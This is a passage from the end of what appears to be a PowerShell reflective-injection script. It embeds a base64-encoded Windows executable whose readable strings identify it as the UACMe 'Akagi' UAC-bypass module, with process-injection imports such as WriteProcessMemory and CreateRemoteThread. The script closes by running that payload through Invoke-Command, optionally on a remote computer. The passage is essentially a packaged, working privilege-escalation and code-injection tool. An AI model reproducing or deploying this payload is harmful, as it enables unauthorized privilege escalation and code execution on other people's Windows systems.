lZXAApQBDb3B5RmlsZVcA6gVXcml0ZVByb2Nlc3NNZW1vcnkAAGEFVGVybWluYXRlUHJvY2VzcwAAqwVXYWl0Rm9yU2luZ2xlT2JqZWN0AH8AQ2xvc2VIYW5kbGUAnAVWaXJ0dWFsQWxsb2NFeAAAZwJHZXRNb2R1bGVIYW5kbGVXAADcAENyZWF0ZVJlbW90ZVRocmVhZAAAyQFHZXRDb21tYW5kTGluZVcACQJHZXRDdXJyZW50UHJvY2VzcwBRAUV4aXRQcm9jZXNzAFAEUmVhZEZpbGUAAOEFV3JpdGVGaWxlAPwEU2V0RmlsZVBvaW50ZXIAADcCR2V0RmlsZUluZm9ybWF0aW9uQnlIYW5kbGUAAOICR2V0VGVtcFBhdGhBAABQAkdldExhc3RFcnJvcgAAugBDcmVhdGVGaWxlQQAHAURlbGV0ZUZpbGVBAFwBRmlsZVRpbWVUb0xvY2FsRmlsZVRpbWUAzQVXaWRlQ2hhclRvTXVsdGlCeXRlAOACR2V0VGVtcEZpbGVOYW1lQQAAWwFGaWxlVGltZVRvRG9zRGF0ZVRpbWUAvgJHZXRTdGFydHVwSW5mb1cACwVTZXRMYXN0RXJyb3IAAMIAQ3JlYXRlRmlsZVcA7gNPcGVuUHJvY2VzcwCWBVZlclNldENvbmRpdGlvbk1hc2sA2wBDcmVhdGVQcm9jZXNzVwAAngFGcmVlTGlicmFyeQCaBVZlcmlmeVZlcnNpb25JbmZvVwAApwNMb2FkTGlicmFyeUV4VwAAS0VSTkVMMzIuZGxsAAB7A3dzcHJpbnRmVwA3AUdldERlc2t0b3BXaW5kb3cAAE0CTWVzc2FnZUJveFcACQFGaW5kV2luZG93VwDTAUdldFdpbmRvd1RocmVhZFByb2Nlc3NJZAAAVVNFUjMyLmRsbAAAYAJSZWdDcmVhdGVLZXlXAIUCUmVnT3BlbktleUV4VwCiAlJlZ1NldFZhbHVlRXhXAABUAlJlZ0Nsb3NlS2V5AF0CUmVnQ3JlYXRlS2V5RXhXAEFEVkFQSTMyLmRsbAAANgFTaGVsbEV4ZWN1dGVFeFcAU0hFTEwzMi5kbGwAGQBDb0NyZWF0ZUd1aWQAAPQASUlERnJvbVN0cmluZwAMAENMU0lERnJvbVN0cmluZwBvbGUzMi5kbGwA2ANSdGxHZXRWZXJzaW9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"
	
	if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, $ExeArgs)
	}
	else
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, $ExeArgs) -ComputerName $ComputerName
	}
}
Main
}